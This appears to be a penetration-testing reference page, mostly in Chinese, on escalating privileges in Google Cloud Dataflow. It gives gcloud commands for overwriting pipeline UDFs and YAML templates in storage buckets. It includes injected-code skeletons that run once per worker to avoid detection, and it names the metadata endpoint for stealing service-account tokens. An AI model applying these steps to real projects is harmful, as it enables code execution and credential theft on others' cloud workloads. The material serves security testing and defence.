# GCP - Dataflow Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### `storage.objects.create`, `storage.objects.get`, `storage.objects.update`

Dataflow 不验证存储在 GCS 中的 UDFs 和 job template YAML 的完整性。  
如果拥有 bucket 的写权限，你可以覆盖这些文件以注入代码、在 worker 上执行代码、窃取 service account tokens，或更改数据处理流程。批处理和流式 pipeline 作业都是此攻击的可行目标。要在 pipeline 上执行此攻击，需要在作业运行之前、运行开始的前几分钟（在作业 workers 被创建之前），或在作业运行期间在新 workers 因 autoscaling 启动之前替换 UDFs/templates。

**Attack vectors:**
- **UDF hijacking:** Python (`.py`) and JS (`.js`) UDFs referenced by pipelines and stored in customer-managed buckets
- **Job template hijacking:** Custom YAML pipeline definitions stored in customer-managed buckets


> [!WARNING]
> **Run-once-per-worker trick:** Dataflow UDFs and template callables are invoked **per row/line**。如果不做协调，exfiltration 或 token 窃取会被执行成千上万次，造成噪音、速率限制和检测。使用 **file-based coordination** 模式：在开始时检查标记文件（例如 `/tmp/pwnd.txt`）是否存在；如果存在则跳过恶意代码；如果不存在则运行 payload 并创建该文件。这样可以确保 payload **每个 worker 运行一次**，而不是每行运行一次。


#### Direct exploitation via gcloud CLI

1. Enumerate Dataflow jobs and locate the template/UDF GCS paths:

<details>

<summary>List jobs and describe to get template path, staging location, and UDF references</summary>
```bash
# List jobs (optionally filter by region)
gcloud dataflow jobs list --region=<region>
gcloud dataflow jobs list --project=<PROJECT_ID>

# Describe a job to get template GCS path, staging location, and any UDF/template references
gcloud dataflow jobs describe <JOB_ID> --region=<region> --full --format="yaml"
# Look for: currentState, createTime, jobMetadata, type (JOB_TYPE_STREAMING or JOB_TYPE_BATCH)
# Pipeline options often include: tempLocation, stagingLocation, templateLocation, or flexTemplateGcsPath
```
</details>

2. 从 GCS 下载原始 UDF 或作业模板：

<details>

<summary>从存储桶下载 UDF 文件或 YAML 模板</summary>
```bash
# If job references a UDF at gs://bucket/path/to/udf.py
gcloud storage cp gs://<BUCKET>/<PATH>/<udf_file>.py ./udf_original.py

# Or for a YAML job template
gcloud storage cp gs://<BUCKET>/<PATH>/<template>.yaml ./template_original.yaml
```
</details>

3. 在本地编辑该文件：注入恶意 payload（见下方 Python UDF 或 YAML 片段），并确保使用 run-once coordination pattern。

4. 重新上传以覆盖原始文件：

<details>

<summary>覆盖存储桶中的 UDF 或模板</summary>
```bash
gcloud storage cp ./udf_injected.py gs://<BUCKET>/<PATH>/<udf_file>.py

# Or for YAML
gcloud storage cp ./template_injected.yaml gs://<BUCKET>/<PATH>/<template>.yaml
```
</details>

5. 等待下一次 job 运行，或者（对于 streaming）触发 autoscaling（例如大量发送 pipeline 输入）以便新的 workers 启动并拉取已修改的文件。

#### Python UDF injection

如果你想让 worker exfiltrate 数据到你的 C2 server，请使用 `urllib.request` 而不是 `requests`。
`requests` 没有预装在 classic Dataflow workers 上。

<details>

<summary>Malicious UDF with run-once coordination and metadata extraction</summary>
```python
import os
import json
import urllib.request
from datetime import datetime

def _malicious_func():
# File-based coordination: run once per worker.
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return

# malicous code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")

def transform(line):
# Malicous code entry point - runs per line but coordination ensures once per worker
try:
_malicious_func()
except Exception:
pass
# ... original UDF logic follows ...
```
</details>


#### Job template YAML injection

注入一个包含使用协调文件的可调用函数的 `MapToFields` 步骤。对于基于 YAML 的 pipelines，如果模板声明了 `dependencies: [requests]` 并且支持 `requests`，请使用它；否则优先使用 `urllib.request`。

添加清理步骤（`drop: [malicious_step]`），以便管道仍然将有效数据写入目标。

<details>

<summary>管道 YAML 中的恶意 MapToFields 步骤和清理</summary>
```yaml
- name: MaliciousTransform
type: MapToFields
input: Transform
config:
language: python
fields:
malicious_step:
callable: |
def extract_and_return(row):
import os
import json
from datetime import datetime
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return True
try:
import urllib.request
# malicious code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")
except Exception:
pass
return True
append: true
- name: CleanupTransform
type: MapToFields
input: MaliciousTransform
config:
fields: {}
append: true
drop:
- malicious_step
```
</details>

### Compute Engine 对 Dataflow Workers 的访问

**Permissions:** `compute.instances.osLogin` or `compute.instances.osAdminLogin` (with `iam.serviceAccounts.actAs` over the worker SA), or `compute.instances.setMetadata` / `compute.projects.setCommonInstanceMetadata` (with `iam.serviceAccounts.actAs`) for legacy SSH key injection

Dataflow workers 作为 Compute Engine VMs 运行。通过 OS Login 或 SSH 访问 workers 可以让你从元数据端点读取 SA tokens（`http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`）、操作数据，或运行任意代码。

For exploitation details, see:
- [GCP - Compute Privesc](gcp-compute-privesc/README.md) — `compute.instances.osLogin`, `compute.instances.osAdminLogin`, `compute.instances.setMetadata`

## References

- [Dataflow Rider: How Attackers can Abuse Shadow Resources in Google Cloud Dataflow](https://www.varonis.com/blog/dataflow-rider)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [gcloud dataflow jobs describe](https://cloud.google.com/sdk/gcloud/reference/dataflow/jobs/describe)
- [Apache Beam YAML: User-defined functions](https://beam.apache.org/documentation/sdks/yaml-udf/)
- [Apache Beam YAML Transform Reference](https://beam.apache.org/releases/yamldoc/current/)

{{#include ../../../banners/hacktricks-training.md}}
